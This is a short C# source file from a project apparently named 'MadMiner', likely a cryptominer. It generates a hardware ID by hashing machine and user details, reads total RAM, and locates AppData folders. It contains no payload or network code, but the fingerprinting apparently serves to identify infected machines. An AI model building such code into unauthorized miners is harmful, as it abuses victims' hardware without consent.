using Microsoft.VisualBasic.Devices;
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace MadMiner
{
    class Help
    {
        public static readonly string Local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static readonly string Roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string id = HwidGen.HWID() + "M01";


        public static string GetRamMemory()
        {
            return string.Format("{0:0.00}",
                Convert.ToSingle(new ComputerInfo().TotalPhysicalMemory) / 1024 / 1024 / 1024);
        }


    }

    public static class HwidGen
    {
        public static string HWID()
        {
            try
            {
                return GetHash(Environment.ProcessorCount.ToString() + Environment.UserName + Environment.MachineName + (object)Environment.OSVersion + (object)new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
            }
            catch
            {
                return "ErrorHWID.log";
            }
        }

        public static string GetHash(string strToHash)
        {
            byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(strToHash));
            StringBuilder stringBuilder = new StringBuilder();
            foreach (byte num in hash)
                stringBuilder.Append(num.ToString("x2"));
            return stringBuilder.ToString().Substring(0, 20).ToUpper();
        }
    }
}
